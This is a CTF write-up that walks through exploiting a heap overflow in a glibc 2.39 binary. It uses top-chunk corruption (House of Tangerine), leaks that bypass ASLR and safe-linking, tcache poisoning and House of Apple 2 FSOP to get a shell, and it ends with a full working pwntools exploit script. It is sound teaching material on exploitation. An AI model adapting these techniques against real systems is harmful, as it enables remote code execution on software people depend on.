+++
title = 'A Journey to the House of Tangerine'
date = 2025-01-04
publishDate = 2025-01-04
tags = ['ctf', 'pwn', 'writeup', 'heap', 'exploit', 'house-of-tangerine']
+++

A couple of weeks ago my friend [Sir_X](https://x.com/Sir_X72563) told me about a heap challenge he was working on. Since I still have much to learn in this area, I decided to join him. Like most challenges of this kind, the journey was challenging but ultimately rewarding.

<!--more-->

## TL;DR

The challenge allows for creating, editing, and displaying memory blocks on the heap but notably lacks a method to free them. Both the create and edit functions contain overflow vulnerabilities, which can be exploited to manipulate the heap. The exploitation strategy focuses on corrupting the top chunk size, forcing the remaining top chunk to be freed during the next allocation that exceeds the corrupted size. By leveraging various techniques, it is possible to leak pointers, bypass ASLR and safe-linking protections, and ultimately corrupt the tcache to achieve RCE through File Stream Oriented Programming (FSOP).
## The Challenge

The challenge includes two files: the challenge binary named `secureStorage` and `libc.so.6` version 2.39. As shown below, all mitigations are enabled.

```sh
[*] 'secureStorage'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'.'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[*] 'libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    FORTIFY:    Enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
    Debuginfo:  Yes
```

The binary provides a simple cli interface that allows for creating, reading and editing entries.

```sh
$ ./secureStorage       
[1] Create Permit Entry
[2] Read Permit Entry
[3] Edit Permit Entry
[4] Exit Permit Manager
>> 
```

If we take a look a the decompiled binary we can see that these entries are stored on heap memory, allocated through `malloc`. 

```c
int create(void) {
  uint idx;
  int ret;
  uint size;
  long *mem_ptr;
  
  puts("Enter permit index:");
  idx = read_opt();
  if ((idx < 0x20) && (chunks[idx] == (long *)0x0)) {
    puts("Enter entry size:");
    size = read_opt();
    if ((size < 0x1001) && (size != 0)) {
      mem_ptr = (long *)malloc((ulong)size);
      chunks[idx] = mem_ptr;
      if (chunks[idx] == (long *)0x0) {
        puts("failed");
        ret = -1;
      }
      else {
        sizes[idx] = size;
        puts("Enter entry data:");
        read(0,chunks[idx],(ulong)(size + 0x10));
        ret = 0;
      }
    }
    else {
      puts("Invalid entry size");
      ret = -1;
    }
  }
  else {
    puts("Invalid index");
    ret = -1;
  }
  return ret;
}
```

For the `create` function we can already note a couple of things:
1. There is a fixed maximum of 20 entries.
2. Maximum size for each chunk is 0x1000 (= 4096) bytes.
3. There is an overflow of 0x10 (= 16) bytes when writing to a chunk.

The `edit` function looks quite similar. There is the same overflow of 16 bytes when writing to an existing chunk.

```c
int edit(void) {
  uint idx;
  int ret;
  
  puts("Enter entry index:");
  idx = read_opt();
  if ((idx < 0x20) && (chunks[idx] != (long *)0x0)) {
    puts("Enter data:");
    read(0,chunks[idx],(long)(int)(sizes[idx] + 0x10));
    ret = 0;
  }
  else {
    puts("Invalid entry index");
    ret = -1;
  }
  return ret;
}
```

Last but not least there is a `show` function that prints a given chunk using `puts`.

```c
int show(void) {
  uint idx;
  
  puts("Enter entry index:");
  idx = read_opt();
  if ((idx < 0x20) && (chunks[idx] != (long *)0x0)) {
    puts((char *)chunks[idx]);
  }
  else {
    puts("Invalid index");
  }
  return 0;
}
```

## First Iteration

Now at this point it's obvious that we're dealing with a heap challenge. It's notable though that there is no delete or remove function that would allow us to `free` allocated blocks. Since most heap exploitation techniques seem to rely on corrupting free lists this confused me quite a bit. Is it possible to get chunks into any of the free lists without using `free`?

After some research, it became clear that it is indeed possible, and there are a few methods available that don't rely on `free`. In the infamous [how2heap](https://github.com/shellphish/how2heap) repository there is a technique listed called *House of Tangerine* that would also match the glibc version provided by the challenge. It takes advantage of glibc's `_int_free` function, which is triggered when the top chunk lacks sufficient space to fulfill the requested allocation size. 

So the basic idea is to corrupt the top chunk size using the overflow to force the remaining top chunk to be freed upon the next allocation. Once we have a freed chunk in the tcache bin we can perform tcache-poisoning which consists of corrupting the forward pointer in the freed chunk, again using the overflow, to point to an arbitrary address and then writing to it with the next allocation.

So the plan is:
- Use House of Tangerine for tcache-poisoning to get arbitrary write
- Use arbitrary write to gain RCE

With lots of optimism and without putting much thought into it I started translating House of Tangerine from the [how2heap](https://github.com/shellphish/how2heap) repository to a pwntools script. But much to my surprise some problems arose. If we take a look at the code snippet of the exploit example we can see that in order to perform tcache poisoning a heap pointer is incremented by `2`, which to my understanding equals 16 bytes (2 indices 8 bytes each). The overflow would not allow to write that far since we are constrained to write 16 bytes over the boundary only.

Also, in order to bypass safe-linking (more on that later) some sort of heap leak is required. The comment *(requires heap leak on and after 2.32)* in the top section of the file suddenly makes sense. :)

```c
/* how2heap/glibc_2.39/house_of_tangerine.c */
int main() {
  (...)
  // this will be our vuln_tcache for tcache poisoning
  vuln_tcache = (size_t) &heap_ptr[(SIZE_3 / SIZE_SZ) + 2];
  (...)
  // corrupt next ptr into pointing to target
  // use a heap leak to bypass safe linking (GLIBC >= 2.32)
  heap_ptr[(vuln_tcache - (size_t) heap_ptr) / SIZE_SZ] = target ^ (vuln_tcache >> 12);
  (...)
}
```

## Round Two

After some more time researching [Sir_X](https://x.com/Sir_X72563) dug up [this blogpost](https://web.archive.org/web/20210613164247/https://dystopia.sg/seccon-beginners-2021-freeless/) which looked quite promising. The setup of the vulnerable binary is quite similar, with one notable difference: the challenge uses glibc 2.31, whereas our case involves glibc 2.39. This will bring some additional challenges that we will see later. To not replicate the whole blog post I will only list the key findings of that read.

One other thing I hadn't really considered until now is the fact that ASLR is enabled. Defeating ASLR, which is essential to gain RCE later in the process, will require a pointer leak. The technique described on said blogpost leverages the show function to achieve this. Just like in our case the method used to print an individual chunk returns all data until a zero byte is encountered. By padding a chunk with data using the overflow, we can leak information from an adjacent chunk, such as the forward pointer, if it happens to be a free chunk.

The exploit as a whole described in the blog post boils down to these steps:
- Get chunks into unsorted bin through top chunk corruption
- Leak next pointer of freed chunk in unsorted bin to calculate libc base thus bypassing ASLR
- Perform tcache-poisoning, again through chunk corruption
- Leverage libc hooks to gain RCE

While a large part of that writeup is similar or even identical to our situation we will need some adaptations. As we have already learned, safe-linking is in place since glibc 2.32. This means that pointers in tcache chunks are encrypted and we will need a heap leak to defeat this mechanism. Also, with glibc 2.39 malloc hooks are no longer a thing \[2\] so we will need another method to gain RCE.

### Unsorted Bin

Let's get started with the unsorted bin which we will need to leak a libc pointer. As mentioned earlier, the first few stages are identical to the exploit described in \[1\] and are therefore essentially copied. As described in said blog post the top chunk corruption is bound to some restrictions, namely:

- The top chunk size must be larger than `0x10`
- `PREV_INUSE` bit must be set
- Must be page aligned (multiple of `0x1000`)

In the exploit we simply take the initial top chunk size after setting up the heap and trim off everything except the last 3 nibbles. In our case the initial size is `0x20d50` (`0x20d51` with `PREV_INUSE` bit set). Therefore our corrupted size must be `0xd51`.

![Initial top chunk size.](/house-of-tangerine/hot-gef-topchunk-size.png)

After corrupting the top chunk size, we create a new allocation request for `0xd48` bytes, which exceeds the available size in the top chunk, thereby triggering a free of the top chunk.

```python
# setup heap
create(0, 0x18, 0x18 * b"A")
# corrupt top chunk size
edit(0, 0x18 * b"B" + p64(0xd51))
# trigger free of top chunk
create(1, 0xd48, 0xd48 * b"B")
```

If we take a look at the heap after these steps we can see that there is indeed a chunk in unsorted bins with a size of `0xd30`. Additionally, two new chunks of size `0x10` each are created, known as fencepost chunks. Further details about this effect can be found in \[1\].

![Contents of unsorted bin.](/house-of-tangerine/hot-gef-unsorted-bin.png)

What is important for us is the highlighted pointer within the freed chunk in the unsorted bins. This pointer points to the main arena within libc, allowing us to bypass ASLR if we manage to leak it. The process is straight-forward. We can simply pad our first chunk up to the next pointer of the adjacent chunk and trigger a `show` on that chunk to leak the address. 

```python
# pad to leak next ptr
edit(0, cyclic(0x20))
# leak next ptr (main_arena + 96)
next_ptr = extract_address(show(0)[0x20:])
# calculate libc base
libc.address = next_ptr - 96 - libc.sym.main_arena
```

To get the libc base we can subtract the relative offset of the pointer. Then we go ahead and restore everything to have a clean state before continuing.

```python
# restore state
edit(0, 0x18 * b"A" + 0xd31)
# make sure unsorted bin is used up
create(2, 0xd18, 0xd18 * b"C")
```
### Tcache Poisoning

Next up is step two in the chain which consists of poisoning tcache to return an arbitrary pointer. We proceed by corrupting the top chunk size and forcing chunks into tcachebins. Again, the process is the same as in \[1\] and is essentially replicated.

```python
# corrupt top chunk size
edit(1, 0xd48 * b"B" + p64(0x2b1))
# trigger free to link a chunk into tcachebins
create(3, 0x2a8, 0x2a8 * b"D")

# shrink free space to 0x290
create(4, 0xa98, 0xa98 * b"E")
# corrupt top chunk size
edit(4, 0xa98 * b"E" + p64(0x2B1))

# trigger another free to link a chunk into tcachebins
create(5, 0x2a8, 0x2a8 * b"F")
```

Using this technique we arrive at a situation where we have two chunks linked into tcache and control over an adjacent chunk, in this case the chunk with index 4, filled with the character E (=0x45).

![Contents of tcache bin.](/house-of-tangerine/hot-gef-tcache-bins.png)

This allows us to do two things. First, we can leak the encrypted forward pointer using the same method as with the one in the unsorted bins. Second, we can obviously also overwrite the forward pointer. Now, what's interesting here is that this time, unlike the situation in iteration one, the forward pointer is closer to our controlled buffer. We no longer need to be able to write over 16 bytes. It seems to me that, due to the different sizes used in top chunk corruption, the alignment is shifted, allowing us to reach the mentioned pointer.
### Bypass Safe-Linking

Now, what about safe-linking? Safe-linking essentially means that every forward pointer in fastbins and tcache linked lists is encrypted. P is the pointer itself, L the location of the pointer and P' the encrypted pointer. There are great articles about the topic out there such as \[3\] and \[4\]  (Image from \[4\]).

![Encryption process of safe-linking.](/house-of-tangerine/hot-safe-linking.png)

Since we are able to leak an encrypted pointer we can recover the original pointer or at least parts of it. To achieve this a script found in another writeup \[5\] can be used. In this case I noticed that the last 3 nibbles of the recovered pointer were always off but seemed to be stable at runtime. I would assume that they are indeed stable as they should be dependent on allocations done beforehand which is in our control. So I decided to "fix" the last 3 nibbles manually. The encryption key, which we will need to encrypt our malicious pointer, can finally be recovered by XORing the encrypted pointer with the decrypted one.

```python
# pad to leak forward pointer
edit(4, cyclic(0xA98 + 0x8))
# leak encrypted forward pointer
encrypted_ptr = extract_address(show(4)[0xA98 + 0x8:])
# decrypt forward pointer
dec = decrypt_ptr(encrypted_ptr)
# fix forward pointer
dec &= ~0xfff
dec += 0xd60
# recover encryption key
key = encrypted_ptr ^ dec
```

Let's quickly recap, we now have:
- Defeated ASLR
	- Top chunk corruption (overflow) to force chunks into unsorted bin
	- Pointer leak (overflow)
- Defeated Safe-Linking
	- Top chunk corruption (overflow) to force chunks into tcache bin
	- Pointer leak (overflow)
	- Recovered encryption key
- Established setup for tcache-poisoning

This means we now know where libc is located in memory and we are capable of writing to an arbitrary memory address through tcache-poisoning. 

### RCE Through FSOP

Equipped with arbitrary write I stumbled upon another blog post \[6\] detailing a technique called *House of Apple 2* discovered by CTF player [roderick01](https://bbs.kanxue.com/thread-273832.htm). The technique boils down to overwriting `stdout`'s vtable to `_IO_wfile_jumps`, manipulating the `_wide_data` and `_wide_vtable` pointers to controlled memory, and setting the `__doallocate` function pointer to the address of `system`. This should give us a shell. Fortunately for us, this rather complicated process is automated in the `pwncli` library by RoderickChan \[7\] so exploitation is straight-forward.

```python
from pwncli import io_file

file = io_file.IO_FILE_plus_struct()
payload = file.house_of_apple2_execmd_when_do_IO_operation(
        libc.sym["_IO_2_1_stdout_"],
        libc.sym["_IO_wfile_jumps"],
        libc.sym["system"])

# define target address
target = libc.sym["_IO_2_1_stdout_"]
# encrypt target address
target_enc = target ^ key

# overwrite next ptr
edit(4, 0xa98 * b"E" + p64(0x291) + p64(target_enc))
# first allocation
create(6, 0x288, 0x288 * b"G")
# second allocation at arbitrary pointer
create(7, 0x288, payload)

p.interactive()
```

After putting everything together:
```sh
$ python exploit.py
[+] Starting local process './secureStorage': pid 38155
Leaked unsorted next ptr: 0x7fccf1803b20
Location libc: 0x7fccf1600000
Leaked tcache next ptr: 0x56310c090d60
Safe-Linking encryption key: 0x56310c0b2
[*] Switching to interactive mode

$ id
uid=1000(kali) gid=1000(kali) groups=1000(kali)
```

Yay! 🎉
### Full Exploit

```python
from pwn import *
from pwncli import io_file

context.arch = "amd64"

binary = "./secureStorage"
elf = ELF(binary)
libc = ELF("libc.so.6")

p = process(binary)

def create(idx, size, data):
    p.sendlineafter(b">> ", b"1")
    p.sendlineafter(b"index:", str(idx).encode())
    p.sendlineafter(b"size:", str(size).encode())
    p.sendafter(b"data:", data)

def show(idx):
    p.sendlineafter(b">> ", b"2")
    p.sendlineafter(b"index:", str(idx).encode())

    output = p.recvuntil(b"[1] Create Permit Entry", drop=True)
    chunk_data = output.strip()

    return chunk_data

def edit(idx, data):
    p.sendlineafter(b">> ", b"3")
    p.sendlineafter(b"index:", str(idx).encode())
    p.sendafter(b"data:", data)

def extract_address(leak):
    return u64(leak[:6].ljust(8, b"\x00"))

def decrypt_ptr(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val

# setup heap
create(0, 0x18, 0x18 * b"A")
# corrupt top_chunk size
edit(0, 0x18 * b"A" + p64(0xd51))
# trigger free of top_chunk
create(1, 0xd48, 0xd48 * b"B")

# pad up top_chunk to leak next ptr
edit(0, cyclic(0x20))

# next_ptr = main_arena + 96
next_ptr = extract_address(show(0)[0x20:])
libc.address = next_ptr - 96 - libc.sym.main_arena

print("Leaked unsorted next ptr:", hex(next_ptr))
print("Location libc:", hex(libc.address))

# restore state
edit(0, 0x18 * b"A" + p64(0xd31))
# make sure unsorted is used up
create(2, 0xd18, 0xd18 * b"C")

# corrupt top_chunk size
edit(1, 0xd48 * b"B" + p64(0x2b1))
# trigger free to link a chunk into tcachebins
create(3, 0x2a8, 0x2a8 * b"D")

# shrink free space to 0x290
create(4, 0xa98, 0xa98 * b"E")
edit(4, 0xa98 * b"E" + p64(0x2B1))

# trigger another free to link a chunk into tcachebins
create(5, 0x2a8, 0x2a8 * b"F")

edit(4, cyclic(0xa98 + 0x8))
encrypted_ptr = extract_address(show(4)[0xa98 + 0x8:])
dec = decrypt_ptr(encrypted_ptr)
dec &= ~0xfff
dec += 0xd60

print("Leaked tcache next ptr:", hex(dec))
key = encrypted_ptr ^ dec
print("Safe-Linking encryption key:", hex(key))

file = io_file.IO_FILE_plus_struct()
payload = file.house_of_apple2_execmd_when_do_IO_operation(
        libc.sym["_IO_2_1_stdout_"],
        libc.sym["_IO_wfile_jumps"],
        libc.sym["system"])

# define target address
target = libc.sym["_IO_2_1_stdout_"]
# encrypt target address
target_enc = target ^ key

# overwrite next ptr
edit(4, 0xa98 * b"E" + p64(0x291) + p64(target_enc))
# first allocation
create(6, 0x288, 0x288 * b"G")
# second allocation at arbitrary pointer
create(7, 0x288, payload)

p.interactive()
```
## Resources
- \[0\] how2heap - https://github.com/shellphish/how2heap
- \[1\] SECCON Beginners: Freeless (Pwn) - https://web.archive.org/web/20210613164247/https://dystopia.sg/seccon-beginners-2021-freeless/
- \[2\] Securing malloc in glibc: Why malloc hooks had to go - https://developers.redhat.com/articles/2021/08/25/securing-malloc-glibc-why-malloc-hooks-had-go
- \[3\] Bypassing glibc Safe-Linking - https://margin.re/2021/09/bypassing-glibc-safe-linking/
- \[4\] Safe-Linking – Eliminating a 20 year-old malloc() exploit primitive-  https://research.checkpoint.com/2020/safe-linking-eliminating-a-20-year-old-malloc-exploit-primitive/
- \[5\] BlueHens CTF 2022 Wide Open - https://ctftime.org/writeup/35951
- \[6\] Leakless Heap Exploitation - The House of Water - https://corgi.rip/posts/leakless_heap_1/#house-of-apple-2
- \[7\] Pwn scripts by RoderickChan - https://github.com/RoderickChan/pwncli/tree/main
